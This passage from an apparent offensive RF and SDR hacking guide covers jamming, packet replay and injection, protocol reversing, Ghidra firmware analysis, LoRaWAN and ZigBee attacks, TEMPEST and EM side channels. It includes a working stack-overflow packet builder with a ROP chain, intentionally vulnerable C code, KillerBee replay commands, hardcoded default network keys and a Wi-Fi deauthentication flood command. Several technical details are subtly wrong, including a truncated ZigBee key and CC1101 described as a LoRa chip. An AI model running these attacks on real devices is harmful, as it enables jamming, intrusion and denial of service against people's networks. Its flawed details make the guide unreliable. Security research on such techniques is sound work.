#### Jamming

Jamming denies service by flooding the target frequency with noise or interference.

| Jamming Type | Method | Detection Difficulty |
|-------------|--------|---------------------|
| **Spot jamming** | Continuous wave or noise on exact frequency | Easy — energy always present |
| **Sweep jamming** | Sweep across a band | Medium |
| **Barrage jamming** | Noise across wide band | Easy — raises noise floor everywhere |
| **Reactive jamming** | Detect-then-jam; only active when target signal present | Hard — appears as interference |
| **Deceptive jamming** | Transmit valid-looking but incorrect data | Hard — target appears to function |

```python
# GNU Radio: simple spot jammer (authorized jamming/testing lab only)
# Flowgraph:
# [Signal Source: noise] → [Multiply Const (power)] → [osmocom Sink]

# More sophisticated: reactive jammer
# [osmocom Source] → [Power Squelch] → [trigger_on_signal]
#                                              │
#                                     [Start noise TX on detection]
```

#### Signal Injection and Spoofing

Rather than blocking the receiver, inject a malicious but valid-looking signal.

**Replay attack:** Re-transmit a previously captured valid packet.

**Crafted packet injection:** Construct a packet from scratch using reverse-engineered protocol knowledge.

**Signal level attacks:**

```python
# AGC saturation attack: transmit a very strong signal on the target frequency
# Goal: saturate the receiver's AGC, making it temporarily deaf
# When AGC recovers, inject your packet

# More sophisticated: inject while AGC is saturated so legitimate signal is missed
# This requires precise timing relative to transmitted packet bursts
```

**Frequency deviation attack:**

Some FSK receivers have finite discrimination windows. Transmitting at a frequency slightly off from the expected center can cause misdetection or undefined behavior in poorly designed receivers.

---

### Chapter 8: Reversing Custom Signals

Custom signals (proprietary protocols from devices with no public documentation) require systematic reverse engineering.

#### The Unknown Signal Methodology

```
Phase 1: Physical characterization
  ├── Frequency (from FCC ID, spectrum measurement)
  ├── Bandwidth (-3 dB and -20 dB)
  ├── Modulation type (visual ID + ML classification)
  ├── Approximate symbol rate (power spectrum of |IQ|²)
  └── Temporal behavior (burst length, repetition rate, trigger)

Phase 2: Bit-level extraction  
  ├── Demodulate with appropriate modulation type
  ├── Find optimal bit rate (sweep rate, minimize errors)
  ├── Identify encoding (Manchester, NRZ, etc.)
  └── Extract raw bit stream for multiple captures

Phase 3: Protocol structure identification
  ├── Find preamble/sync word (constant across captures)
  ├── Find fields that change vs. fields that stay constant
  ├── Identify length fields (correlates with message length variation)
  ├── Find checksum/CRC (changes with data changes)
  └── Identify payload vs. header

Phase 4: Field semantics
  ├── Correlate numeric fields with physical button actions
  ├── Identify device ID / address fields (constant per device)
  ├── Find counter/rolling code fields (monotonically increasing)
  └── Decode any encoded sub-fields

Phase 5: Forgery
  ├── Construct a valid packet with chosen payload values
  ├── Verify CRC/checksum calculation
  └── Transmit and verify device response
```

#### Differential Analysis

Capture the same action multiple times; capture different actions; compare.

```python
def differential_analysis(packets: list[bytes]) -> dict:
    """
    Compare multiple packets to find constant vs. variable fields.
    
    Returns dict:
      'constant': byte indices that never change
      'variable': byte indices that change across packets
      'changing_fields': byte indices with values across all packets
    """
    if not packets:
        return {}
    
    max_len = max(len(p) for p in packets)
    
    constant_fields = []
    variable_fields = []
    
    for byte_idx in range(max_len):
        values = set()
        for packet in packets:
            if byte_idx < len(packet):
                values.add(packet[byte_idx])
        
        if len(values) == 1:
            constant_fields.append(byte_idx)
        else:
            variable_fields.append(byte_idx)
    
    # Show what's at each position
    print("Byte | Constant? | Values seen")
    print("-" * 50)
    for byte_idx in range(max_len):
        values = [p[byte_idx] if byte_idx < len(p) else None for p in packets]
        unique = set(v for v in values if v is not None)
        const = "YES" if len(unique) == 1 else "no"
        hex_vals = ' '.join(f'{v:02X}' for v in sorted(unique) if v is not None)
        print(f"  {byte_idx:3d}  |    {const}    | {hex_vals}")
    
    return {
        'constant': constant_fields,
        'variable': variable_fields,
    }

# Example:
# packets = [bytes.fromhex(h) for h in [
#     'AA AA D3 91 01 00 42 FF A1 B2',
#     'AA AA D3 91 01 00 42 FF A2 B2',
#     'AA AA D3 91 01 00 42 FF A3 B2',
# ]]
# differential_analysis(packets)
# → Bytes 0-8 constant; byte 8 varies (counter or sequence field)
```

#### CRC Identification and Calculation

Finding the CRC algorithm used in a protocol:

```python
import crcmod

def identify_crc(packets_with_known_crc: list[tuple[bytes, int]], 
                  crc_algorithms: list[str] = None):
    """
    Try multiple CRC algorithms to find which one matches.
    packets_with_known_crc: list of (data_bytes, expected_crc) tuples
    """
    if crc_algorithms is None:
        crc_algorithms = [
            'crc-8', 'crc-8-maxim', 'crc-16', 'crc-16-ccitt', 
            'crc-16-mcrf4xx', 'crc-32', 'crc-32c',
            'crc-16-dnp', 'crc-16-usb',
        ]
    
    for algo in crc_algorithms:
        try:
            crc_fn = crcmod.predefined.mkCrcFun(algo)
            matches = 0
            for data, expected_crc in packets_with_known_crc:
                calculated = crc_fn(data)
                if calculated == expected_crc:
                    matches += 1
            
            if matches == len(packets_with_known_crc):
                print(f"CRC algorithm found: {algo}")
                return algo
            elif matches > 0:
                print(f"Partial match ({matches}/{len(packets_with_known_crc)}): {algo}")
        except Exception:
            pass
    
    print("No standard CRC algorithm matched. May be custom or XOR-based.")
    return None

def brute_force_crc_poly(data: bytes, expected_crc: int, width: int = 8):
    """
    Brute-force a custom CRC polynomial (practical for 8-bit CRCs).
    For 16-bit: search space is 65536; feasible.
    For 32-bit: search space is 4B; requires GPU or long time.
    """
    for poly in range(0, 2**width):
        for init in [0x00, 0xFF]:
            for xor_out in [0x00, 0xFF]:
                try:
                    crc_fn = crcmod.mkCrcFun(
                        poly | (1 << width),  # Add implicit leading 1
                        initCrc=init,
                        xorOut=xor_out,
                        rev=False
                    )
                    if crc_fn(data) == expected_crc:
                        print(f"Found: poly=0x{poly:02X}, init=0x{init:02X}, "
                              f"xorOut=0x{xor_out:02X}")
                        return poly, init, xor_out
                except Exception:
                    pass
    return None
```

---

### Chapter 9: Firmware Analysis with Ghidra

Once a target device is identified, analyzing its firmware is often the fastest path to finding exploitable vulnerabilities in the wireless stack.

#### Firmware Extraction

| Method | How | Best For |
|--------|-----|---------|
| **OTA update capture** | Intercept update traffic (HTTP/HTTPS, or RF OTA) | Devices with plaintext or reversible update formats |
| **UART/serial console** | Boot log often shows firmware addresses; `tftp`/`cat /proc/mtd` | Linux-based devices |
| **JTAG/SWD** | Read flash directly (see Hardware Hacking section) | Microcontrollers; ARM Cortex-M |
| **SPI flash dump** | `flashrom` or Bus Pirate reads external SPI NOR flash | Any device with external flash |
| **Vendor source** | GPL compliance disclosure; FCC test firmware | Linux-based products |
| **Binwalk extraction** | Decompress/carve firmware images | Combined images with multiple sections |

```bash
# Extract and analyze firmware
binwalk -e firmware.bin          # Extract known formats
binwalk -A firmware.bin          # Find architecture hints (ARM opcodes, etc.)
binwalk -B firmware.bin          # Entropy analysis (high entropy = encrypted/compressed)
strings firmware.bin | grep -E "(key|pass|secret|token|cred)" -i

# If entropy is high throughout: encrypted
# Look for key in bootloader (lower entropy section)
# Or capture key material via JTAG/memory dump during runtime
```

#### Ghidra Setup for RF Firmware

```bash
# Install Ghidra
# Download from: https://ghidra-sre.org
# Requires Java 17+: sudo apt install openjdk-17-jdk

# Launch
./ghidraRun

# Useful Ghidra plugins for RF firmware:
# - SVD-Loader: imports CPU peripheral register definitions (from ARM CMSIS SVD files)
#   Install via: CodeBrowser → File → Install Extensions
# - Renesas-Info: adds register info for common RF SoCs  
# - ghidra-firmware-utils: better handling of raw binary and UEFI/EFI
```

#### Analyzing RF Baseband Code in Ghidra

The RF baseband in a device handles parsing and acting on received RF packets. This is where vulnerabilities live.

**Finding the RF receive handler:**

```
Strategy 1: String search
  Search → For Strings → "received", "packet", "frame", "CRC error"
  These strings often appear near the packet parsing code

Strategy 2: Cross-reference data structures
  Identify packet buffer location (often a fixed memory address or struct)
  Find all code that reads from or writes to that buffer

Strategy 3: Interrupt handler
  RF chips generate interrupts on packet receive
  Find interrupt vector table → follow IRQ handler → find packet dispatcher

Strategy 4: Known API patterns  
  If using a known RF chip (CC1101, nRF52, SX1276), find the chip's 
  receive callback function (documented in chip SDK)
  e.g., for CC1101: search for 0xBF (SIDLE strobe command) to find radio control code
```

**Common vulnerability patterns in RF baseband code:**

```c
// VULNERABLE: No bounds check on received length field
void process_received_packet(uint8_t *rx_buf) {
    uint8_t length = rx_buf[0];          // Length from untrusted packet!
    uint8_t *payload = rx_buf + 1;
    
    memcpy(internal_buffer, payload, length);  // Buffer overflow if length > sizeof(internal_buffer)
    // ↑ Classic stack/heap overflow via malicious RF packet
}

// VULNERABLE: Format string via received data
void log_packet_info(uint8_t *packet_data) {
    char log_buf[64];
    sprintf(log_buf, (char*)packet_data);  // If packet_data contains format specifiers: exploit
}

// VULNERABLE: Integer overflow in length calculation
void process_tlv_fields(uint8_t *data, uint16_t total_len) {
    uint16_t offset = 0;
    while (offset < total_len) {
        uint16_t field_len = data[offset+1];     // Field length from packet
        offset += 2 + field_len;                  // If field_len = 0xFFFF: integer overflow
        // offset may wrap around; loop continues reading out of bounds
    }
}
```

**Ghidra Scripting to find vulnerable patterns:**

```python
# Ghidra script (Python): find memcpy calls where size comes from received data
# Run via: Script Manager → New Script

from ghidra.app.script import GhidraScript
from ghidra.program.model.symbol import RefType

class FindMemcpyVulns(GhidraScript):
    def run(self):
        fm = currentProgram.getFunctionManager()
        
        # Find all memcpy references
        target_funcs = ['memcpy', 'memmove', 'strcpy', 'strcat', 'sprintf']
        
        for func_name in target_funcs:
            syms = getSymbols(func_name, None)
            for sym in syms:
                refs = getReferencesTo(sym.getAddress())
                for ref in refs:
                    if ref.getReferenceType() == RefType.UNCONDITIONAL_CALL:
                        print(f"Call to {func_name} at: {ref.getFromAddress()}")
                        # TODO: trace size argument to check if taint flows from RX buffer
```

---

### Chapter 10: Exploiting RF Baseband Vulnerabilities

#### Exploit Development for RF Targets

RF baseband vulnerabilities are exploited by transmitting specially crafted RF packets. The attack surface is wireless — no physical connection required.

**Exploit delivery pipeline:**

```
[Vulnerability in baseband code]
       │
       ▼
[Craft malicious packet bytes]     ← Triggered by specific field values
       │
       ▼
[Apply correct encoding + framing] ← Preamble, sync, checksum
       │
       ▼
[Modulate to RF signal]            ← Match target's modulation/frequency
       │
       ▼
[Transmit to target]               ← Within range; single packet or multiple
       │
       ▼
[Trigger vulnerability]            ← e.g., buffer overflow in RX handler
       │
       ▼
[Achieve impact]                   ← Code execution, crash, authentication bypass
```

#### Stack Overflow via Malicious Packet — Walkthrough

```python
import struct

# Scenario: discovered via Ghidra analysis that:
# - Packet format: [sync: 2 bytes] [length: 1 byte] [data: N bytes] [CRC: 2 bytes]
# - Receiver does: memcpy(stack_buffer[64], received_data, received_length)
# - No bounds check on received_length
# - MCU is ARM Cortex-M (little-endian)
# - Stack buffer is at frame offset -0x40 from saved LR

SYNC = b'\xAA\xD3'
RETURN_ADDRESS = 0x08001234  # Address of shellcode or ROP gadget (from Ghidra)

def build_exploit_packet(shellcode: bytes) -> bytes:
    # Overflow the 64-byte buffer + overwrite saved LR on stack
    # Stack layout (assuming simple frame): [buffer: 64] [saved_r7: 4] [saved_LR: 4]
    
    payload = b'A' * 64          # Fill buffer
    payload += b'B' * 4          # Overwrite saved r7 (filler)
    payload += struct.pack('<I', RETURN_ADDRESS)  # Overwrite saved LR → our target
    payload += shellcode         # Shellcode after return address (if executable stack)
    
    length = len(payload)
    
    # Build full packet with forged length
    import crcmod
    crc16 = crcmod.predefined.mkCrcFun('crc-16')
    packet_data = struct.pack('B', length) + payload
    crc = crc16(packet_data)
    
    return SYNC + packet_data + struct.pack('>H', crc)

# Transmit exploit packet via HackRF
# hackrf_transfer -t exploit.iq -f [target_freq] -s [samp_rate] -x 40
```

**Constrained environments (no shellcode):** Most modern MCUs have XN (Execute Never) memory protections. Use Return-Oriented Programming (ROP):

```python
# ROP chain for ARM Cortex-M (Thumb mode)
# Each gadget is a small sequence of instructions ending in POP {pc} or BX LR

# Example: call a function with controlled arguments
# Gadget 1: POP {r0, pc}  — loads r0 (first arg) and jumps
# Gadget 2: Address of target function

def build_rop_chain(target_func_addr, arg0):
    """
    Simple 1-argument ROP call on ARM Thumb.
    Requires: gadget that does POP {r0, pc}
    """
    # Find "POP {r0, pc}" gadget in firmware using Ghidra or ROPgadget
    POP_R0_PC = 0x08001ABC  # Example address from Ghidra analysis
    
    rop_chain  = struct.pack('<I', POP_R0_PC)      # Return to gadget
    rop_chain += struct.pack('<I', arg0)            # Value for r0
    rop_chain += struct.pack('<I', target_func_addr | 1)  # |1 for Thumb mode
    
    return rop_chain
```

---

### Chapter 11: Industrial Protocols and LoRa

#### LoRa / LoRaWAN Overview

LoRa (Long Range) is a spread-spectrum modulation technique enabling low-power wide-area communication. LoRaWAN is the MAC-layer protocol built on top of LoRa.

**Physical layer:**

| Parameter | Description | Typical Values |
|-----------|-------------|---------------|
| **Spreading Factor (SF)** | Chips per symbol; SF7–SF12 | SF7 (fast) to SF12 (long range) |
| **Bandwidth (BW)** | Channel bandwidth | 125, 250, 500 kHz |
| **Coding Rate (CR)** | FEC overhead | 4/5, 4/6, 4/7, 4/8 |
| **Frequency** | Regional bands | EU: 868 MHz; US: 915 MHz; AS: 923 MHz |

**Air time vs. SF:**

```
SF7,  BW125, CR4/5 → ~36 ms / 20-byte payload  (short range, fast)
SF12, BW125, CR4/5 → ~2 seconds / 20-byte payload (long range, slow)
```

Higher SF = longer air time = more power consumption = lower duty cycle compliance burden.

#### LoRaWAN Security Architecture

```
Device (End Node)
  ├── NwkSKey: 128-bit AES key — encrypts network header; MIC calculation
  └── AppSKey: 128-bit AES key — encrypts application payload

Network Server
  └── NwkSKey (shared with device)

Application Server
  └── AppSKey (shared with device; network server doesn't see plaintext payload)
```

**Join procedure (OTAA — Over-The-Air Activation):**

```
Device → Network:  Join Request  [DevEUI + AppEUI + DevNonce]
Network → Device:  Join Accept   [AppNonce + NetID + DevAddr + encrypted session keys]

Keys derived:
  NwkSKey = AES128(AppKey, 0x01 || AppNonce || NetID || DevNonce || padding)
  AppSKey = AES128(AppKey, 0x02 || AppNonce || NetID || DevNonce || padding)
```

#### LoRa Signal Reception and Decoding

```bash
# gr-lora: GNU Radio LoRa receiver
# Install
sudo pip3 install gr-lora
# or build from: https://github.com/rpp0/gr-lora

# Capture LoRa signals
# LoRa appears as a characteristic "chirp" on the waterfall
# Up-chirp: frequency increases linearly over symbol period
# Down-chirp: frequency decreases (used as preamble sync)

# Real-time decode
python3 -c "
import osmosdr
import lora  # gr-lora
# Flowgraph: osmocom source → lora receiver → print packets
"

# ChirpStack (open-source LoRaWAN network server) for full stack analysis
# https://www.chirpstack.io
```

**SX1276 LoRa demodulation in Python:**

```python
# ttn_decoder / loradecoder for offline analysis of captured LoRa IQ
# pip install loratools

# Or use SatDump's LoRa decoder for captured files
```

#### LoRaWAN Vulnerability Classes

**1. Join Replay Attack**

```python
# LoRaWAN OTAA join request replay
# The Join Request contains a DevNonce — should be unique per join
# Early LoRaWAN 1.0 spec: DevNonce was random (not counter)
# Attack: replay captured Join Request if DevNonce not tracked by server

# Capture Join Request during legitimate device join
# Replay same Join Request → network server re-issues session keys
# → session keys derived from same DevNonce = predictable if AppKey known
```

**2. Bit-Flip Attack on Unconfirmed Uplinks**

LoRaWAN 1.0 uses AES-CTR for payload encryption. CTR mode is malleable — flipping a bit in the ciphertext flips the corresponding bit in plaintext.

```python
def flip_lora_payload_bit(encrypted_payload: bytes, 
                            bit_position: int) -> bytes:
    """
    Flip a specific bit in a LoRaWAN encrypted payload.
    Without knowing the key, this flips the corresponding plaintext bit.
    Useful when you know the structure of the plaintext (e.g., command bytes).
    """
    byte_idx = bit_position // 8
    bit_idx = bit_position % 8
    
    modified = bytearray(encrypted_payload)
    modified[byte_idx] ^= (1 << bit_idx)
    return bytes(modified)

# Example: if you know byte 0 is a command byte (0=off, 1=on)
# and you intercept an "off" command: flip the LSB to send "on"
```

**3. MIC Brute Force (Class B devices)**

The 4-byte MIC (Message Integrity Code) is calculated using AES-CMAC. For LoRaWAN 1.0, only the first 4 bytes of the CMAC are used.

```python
import struct
from Crypto.Cipher import AES
from Crypto.Hash import CMAC

def calculate_lora_mic(nwk_skey: bytes, mhdr: bytes, fhdr: bytes, 
                        fport: bytes, frmpayload: bytes, 
                        direction: int, devaddr: int, fcnt: int) -> bytes:
    """
    Calculate LoRaWAN 1.0 MIC.
    B0 block construction per LoRaWAN spec.
    """
    msg = mhdr + fhdr + fport + frmpayload
    
    b0 = bytes([0x49, 0x00, 0x00, 0x00, 0x00,
                direction,
                devaddr & 0xFF, (devaddr >> 8) & 0xFF, 
                (devaddr >> 16) & 0xFF, (devaddr >> 24) & 0xFF,
                fcnt & 0xFF, (fcnt >> 8) & 0xFF, 0x00, 0x00,
                0x00, len(msg)])
    
    cobj = CMAC.new(nwk_skey, ciphermod=AES)
    cobj.update(b0 + msg)
    return cobj.digest()[:4]

def verify_mic(packet: bytes, nwk_skey: bytes) -> bool:
    """Verify the MIC of a received LoRaWAN packet"""
    # Parse packet structure
    mhdr = packet[:1]
    # ... parse FHDR, FCnt, FPort, FRMPayload ...
    received_mic = packet[-4:]
    
    # Recalculate
    calculated_mic = calculate_lora_mic(nwk_skey, ...)
    return received_mic == calculated_mic
```

**4. ABP (Activation By Personalization) Key Extraction**

ABP devices have hardcoded session keys. Extracting firmware reveals NwkSKey and AppSKey directly.

```bash
# In Ghidra: search for 16-byte arrays near LoRa API calls
# CC1101-based LoRa nodes often have keys in .rodata section

# strings + grep approach
strings firmware.bin | grep -E "^[0-9A-Fa-f]{32}$"  # 128-bit hex keys
```

#### Fuzzing with Unicorn/Qiling

Unicorn Engine and Qiling provide CPU emulation for running and fuzzing firmware without hardware:

```python
# Unicorn Engine: emulate ARM Cortex-M firmware function
from unicorn import *
from unicorn.arm_const import *

def emulate_packet_parser(firmware_bytes: bytes, 
                           parse_func_addr: int,
                           test_packet: bytes):
    """
    Emulate a firmware packet parsing function with a test packet.
    Useful for fuzzing without needing the actual hardware.
    """
    # Initialize ARM Thumb emulator
    mu = Uc(UC_ARCH_ARM, UC_MODE_THUMB)
    
    # Map firmware
    FLASH_BASE = 0x08000000
    mu.mem_map(FLASH_BASE, 0x100000)  # 1MB flash
    mu.mem_write(FLASH_BASE, firmware_bytes)
    
    # Map RAM
    RAM_BASE = 0x20000000
    mu.mem_map(RAM_BASE, 0x10000)  # 64KB RAM
    
    # Write test packet to RAM
    PACKET_ADDR = RAM_BASE + 0x1000
    mu.mem_write(PACKET_ADDR, test_packet)
    
    # Set up registers: R0 = packet pointer, SP = stack top
    mu.reg_write(UC_ARM_REG_R0, PACKET_ADDR)
    mu.reg_write(UC_ARM_REG_SP, RAM_BASE + 0xF000)
    
    # Hook for crash detection
    def hook_mem_invalid(uc, access, address, size, value, user_data):
        print(f"[!] Memory fault: access={access:#x} addr={address:#x}")
        uc.emu_stop()
        return False
    
    mu.hook_add(UC_HOOK_MEM_INVALID, hook_mem_invalid)
    
    # Emulate function (address must be OR'd with 1 for Thumb)
    try:
        mu.emu_start(parse_func_addr | 1, parse_func_addr + 0x200, 
                     timeout=1000000, count=10000)
    except UcError as e:
        print(f"[!] Unicorn error: {e}")
    
    return mu.reg_read(UC_ARM_REG_R0)  # Return value

# AFL++ with Unicorn for automated fuzzing:
# afl-fuzz -i corpus/ -o findings/ -- python3 unicorn_harness.py @@
```

```python
# Qiling: higher-level firmware emulation
from qiling import *
from qiling.const import QL_VERBOSE

def qiling_fuzz_harness(firmware_path: str, packet: bytes):
    """
    Qiling-based fuzzing harness for firmware packet parsers.
    Provides OS-level emulation for more complete firmware execution.
    """
    ql = Qiling(
        [firmware_path],
        rootfs="/path/to/rootfs",
        verbose=QL_VERBOSE.OFF
    )
    
    # Write packet to memory
    target_addr = ql.mem.search(b'\x00' * len(packet))[0]
    ql.mem.write(target_addr, packet)
    
    # Hook packet receive callback
    def on_packet_receive(ql):
        ql.reg.r0 = target_addr
        ql.reg.r1 = len(packet)
    
    ql.hook_address(on_packet_receive, RECEIVE_CALLBACK_ADDR)
    
    try:
        ql.run()
    except Exception as e:
        print(f"[CRASH] Packet caused: {e}")
        return packet  # Return crashing input
    
    return None
```

---

## Bonus Topics

### Chapter 12: TEMPEST

TEMPEST (a US government codename, retrospectively backronymed as *Transient Electromagnetic Pulse Emanation Standard*) refers to the unintentional emission of electromagnetic signals from electronic equipment that can be captured and analyzed to reconstruct processed information.

#### The Core Concept

Every electronic circuit emits RF radiation as a byproduct of operation. Rapidly switching digital signals radiate according to their frequency content. A CPU processing sensitive data, a display controller rendering an image, or a keyboard generating keystrokes — all emit characteristic RF signatures that can be received and decoded at a distance.

```
Source of emission:
  Digital circuit switching at frequency f
  → Radiates energy at f, 2f, 3f, ... (harmonics)
  → Radiation amplitude proportional to dI/dt (rate of current change)
  → Radiated from PCB traces, cables, power lines (unintentional antennas)

Attacker receives:
  Emissions on a wideband antenna near target
  → Down-converts to baseband
  → Applies signal processing to recover original signal
```

#### Classic TEMPEST: Van Eck Phreaking

Van Eck phreaking (named after Wim van Eck, 1985) is the reconstruction of a CRT or LCD display's contents from its electromagnetic emissions.

```
CRT/LCD controller → Video cable (unintentional antenna) → Radiates sync + pixel data
                                                           ↓
                                                    Nearby antenna + SDR
                                                           ↓
                                               Reconstruct video signal in software
```

**Modern implementation with SDR:**

```python
# gist.github.com/sekuryti/... (TempestSDR-style implementation)
# TempestSDR by Martin Marinov: https://github.com/martinmarinov/TempestSDR

# Basic concept:
# 1. Identify display's horizontal sync frequency (pixel clock / pixels_per_line)
# 2. IQ samples collected at that rate produce one "pixel" per sample
# 3. Reshape samples into (height x width) image
# 4. Apply image processing (deblur, color decode)

def reconstruct_display(iq_samples, sample_rate, 
                          h_sync_freq, width_pixels, height_pixels):
    """
    Attempt display reconstruction from TEMPEST emissions.
    h_sync_freq: horizontal sync frequency in Hz
    """
    import numpy as np
    from PIL import Image
    
    # Samples per line
    samples_per_line = int(sample_rate / h_sync_freq)
    
    # Total samples for one frame
    samples_per_frame = samples_per_line * height_pixels
    
    if len(iq_samples) < samples_per_frame:
        print("Not enough samples for one frame")
        return None
    
    # Take one frame worth of samples
    frame_samples = iq_samples[:samples_per_frame]
    
    # Demodulate (use magnitude for simple case)
    intensity = np.abs(frame_samples)
    
    # Reshape to 2D image
    # Note: actual width in samples may differ from pixel count
    # (includes blanking intervals)
    try:
        image_data = intensity.reshape(height_pixels, samples_per_line)
        
        # Normalize
        image_data = (image_data - image_data.min()) / (image_data.max() - image_data.min())
        
        # Convert to uint8
        image_data = (image_data * 255).astype(np.uint8)
        
        return Image.fromarray(image_data, mode='L')
    except ValueError as e:
        print(f"Reshape error: {e}")
        return None
```

#### TEMPEST Attack Surface Expansion

| Source | Emission | Recovery Technique |
|--------|---------|-------------------|
| **CRT/LCD display** | Video signal harmonics | Van Eck phreaking; TempestSDR |
| **Keyboard** | Keystroke timing via EM pulse | Correlate pulse timing with key timing |
| **CPU cache** | Power/EM correlates with computation | EM side-channel (see Chapter 13) |
| **Crypto accelerator** | Power varies with key data | Power/EM analysis |
| **LED status lights** | Optical emission of traffic data | Optical TEMPEST; "Lamphone" attack |
| **Power line** | Conducted emission on AC power | Power line analysis |
| **USB cable** | USB 3.0 radiation at 5 GHz | USB TEMPEST |

#### TEMPEST Countermeasures

| Countermeasure | What It Addresses |
|----------------|------------------|
| **Faraday shielding** | Contains EM emissions within enclosure |
| **Tempest-rated equipment** | Designed to minimize unintentional emissions |
| **EMSEC filtering** | Power line and signal line filtering |
| **Physical separation** | Distance reduces received signal strength (inverse square) |
| **Noise injection** | Inject wideband noise to mask emissions |
| **Spread-spectrum clocking** | Spreads clock harmonics; reduces peak emission amplitude |

---

### Chapter 13: EM Side-Channel Attacks

EM side-channel attacks are a higher-resolution variant of TEMPEST: using a near-field probe placed close to the target IC to measure EM emissions that correlate with the data being processed.

Unlike far-field TEMPEST (meters of distance), EM side-channel work typically requires the probe within millimeters of the target chip. This is the intersection of hardware hacking (Chapter 3 of the Hardware Hacking section) and SDR/RF signal capture.

#### EM Probe Construction

A simple single-turn loop probe made from coax is sufficient for most near-field EM capture:

```
Coax-based EM probe:
  Cut coax 5 cm from end
  Strip outer jacket 2 cm → expose shield
  Form shield into a loop (1–2 cm diameter)
  Solder loop ends together
  Connect to SDR input via SMA

For higher sensitivity:
  Hand-wound 5-10 turn air-core coil (2 cm diameter)
  Connect to low-noise amplifier → SDR
  Position coil perpendicularly to chip surface
```

**Commercial probes:** Langer EMV probes (IC series) are purpose-built for near-field IC measurement. Riscure also produces EM probes for security research.

#### EM vs. Power Analysis

| Aspect | Power Analysis | EM Side-Channel |
|--------|---------------|----------------|
| **Access required** | Shunt resistor in VCC path | Near-field probe near IC |
| **Trace quality** | Higher SNR (direct measurement) | Lower SNR; position-dependent |
| **Spatial selectivity** | Whole chip | Can target specific circuit regions |
| **Required access** | Need to modify board | Non-invasive; probe placement only |
| **Multi-channel** | Single global supply | Different probes at different locations |

#### EM-DPA Workflow

The analysis methodology mirrors the power analysis DPA covered in the Hardware Hacking section, with EM trace substituted for power traces:

```python
# EM trace collection using SDR
# 1. Position probe above target chip (usually near crypto accelerator)
# 2. Trigger acquisition on target's "start crypto" signal (GPIO or UART)
# 3. Capture a window of EM emission synchronized to crypto operation
# 4. Repeat for N plaintexts

from rtlsdr import RtlSdr
import numpy as np

class EMTraceCollector:
    def __init__(self, center_freq=None, sample_rate=2.4e6, gain=49):
        """
        center_freq: frequency of dominant EM emission from target
                     (find via spectrum sweep while target is running crypto)
        """
        self.sdr = RtlSdr()
        self.sdr.sample_rate = sample_rate
        self.sdr.gain = gain
        
        if center_freq:
            self.sdr.center_freq = center_freq
        else:
            # Default: DC-coupled; capture at low freq where most MCU emissions land
            self.sdr.center_freq = 100e6  # Adjust based on target's clock frequency
    
    def find_emission_frequency(self, duration_s=5):
        """
        Capture spectrum while target runs crypto; find peak emission.
        """
        n_samples = int(self.sdr.sample_rate * duration_s)
        print(f"Collecting {n_samples} samples for frequency identification...")
        samples = self.sdr.read_samples(n_samples)
        
        # FFT
        from scipy.fft import fft, fftfreq, fftshift
        N = min(len(samples), 8192)
        spectrum = np.abs(fftshift(fft(samples[:N])))
        freqs = fftshift(fftfreq(N, 1/self.sdr.sample_rate))
        
        # Find peak
        peak_idx = np.argmax(spectrum)
        peak_freq = self.sdr.center_freq + freqs[peak_idx]
        print(f"Strongest emission at: {peak_freq/1e6:.3f} MHz")
        return peak_freq
    
    def collect_trace(self, n_trace_samples=10000, trigger_fn=None):
        """
        Collect a single EM trace.
        trigger_fn: optional callable; blocks until trigger condition met
        """
        if trigger_fn:
            trigger_fn()  # Wait for trigger (e.g., send encrypt command over UART)
        
        samples = self.sdr.read_samples(n_trace_samples)
        
        # Demodulate: use magnitude for power-like trace
        trace = np.abs(samples)
        return trace
    
    def collect_traces(self, n_traces, plaintexts, encrypt_fn):
        """
        Collect N traces for DPA.
        encrypt_fn(plaintext) → triggers encryption on target and returns ciphertext
        """
        traces = np.zeros((n_traces, 10000))  # Adjust trace length
        
        for i in range(n_traces):
            pt = plaintexts[i]
            
            # Start collection thread, then trigger encrypt
            import threading
            result = [None]
            
            def collect():
                result[0] = self.collect_trace(trigger_fn=None)
            
            t = threading.Thread(target=collect)
            t.start()
            
            # Send encrypt command while collecting
            ct = encrypt_fn(pt)
            t.join(timeout=1.0)
            
            if result[0] is not None:
                traces[i] = result[0]
            
            if i % 100 == 0:
                print(f"Collected {i}/{n_traces}")
        
        return traces
```

After collection, apply DPA/CPA analysis from the Hardware Hacking section — the math is identical; only the measurement source differs.

---

### Chapter 14: ZigBee

ZigBee is the most common IoT/smart home wireless protocol. Built on IEEE 802.15.4, it operates at 2.4 GHz (globally), 868 MHz (Europe), and 915 MHz (US).

#### ZigBee Attack Surface

| Attack | Description | Tool |
|--------|-------------|------|
| **Passive sniffing** | Capture unencrypted ZigBee traffic | Ubertooth, CC2531 USB dongle, KillerBee |
| **Key extraction** | Capture initial key transport or obtain well-known key | KillerBee |
| **Replay attack** | Re-transmit captured commands | KillerBee + custom tools |
| **Packet injection** | Inject crafted IEEE 802.15.4 frames | YARD Stick One, KillerBee |
| **Trust Center attack** | Impersonate trust center during key exchange | Specialized tools |
| **Denial of service** | Jam 2.4 GHz or flood with 802.15.4 beacon frames | YARD Stick One, HackRF |

#### KillerBee Toolkit

```bash
# Install KillerBee
pip install killerbee
# Requires: CC2531 USB dongle flashed with packet sniffer firmware
# or ATMEL RZ RAVEN USB Stick
# or YARD Stick One

# Scan for ZigBee networks
zbfind -i /dev/ttyUSB0

# Passive capture
zbdump -i /dev/ttyUSB0 -c 11 -w capture.pcap  # Channel 11 = 2.405 GHz

# Replay captured frame
zbreplay -i /dev/ttyUSB0 -c 11 -r capture.pcap

# Extract network key from capture (if key transport visible)
zbkey -r capture.pcap

# Decode captured traffic in Wireshark
# Wireshark supports ZigBee with key configured: Edit → Preferences → Protocols → ZigBee
```

#### ZigBee Key Management Weaknesses

```
Join process:
  New device → [Association Request] → Coordinator
  Coordinator → [Association Response] → New device
  Coordinator → [Transport Key (NWK Key)] → New device   ← Key sent in cleartext
                                                              on first join!

Default/well-known keys:
  ZigBee default trust center key: 0x5A696742656541 6C6C69616E636530
  Hue bridge default ZLL key:      0x451234567890ABCDEF456789ABCDEF01
  
Many installations never change from default keys.
```

---

### Chapter 15: Wi-Fi RF Security

Beyond standard 802.11 protocol attacks (WPA2 cracking, PMKID, evil twin — covered in other guide sections), the RF layer of Wi-Fi offers additional attack surfaces accessible via SDR and specialized hardware.

#### RF-Layer Wi-Fi Attacks

**Management frame injection:**

```bash
# Classic: deauthentication flood using Aircrack-ng suite
# (requires monitor-mode capable Wi-Fi adapter, not SDR)
airmon-ng start wlan0
aireplay-ng -0 0 -a [AP_BSSID] -c [CLIENT_MAC] wlan0mon
```

**OFDM pilot tone analysis:**

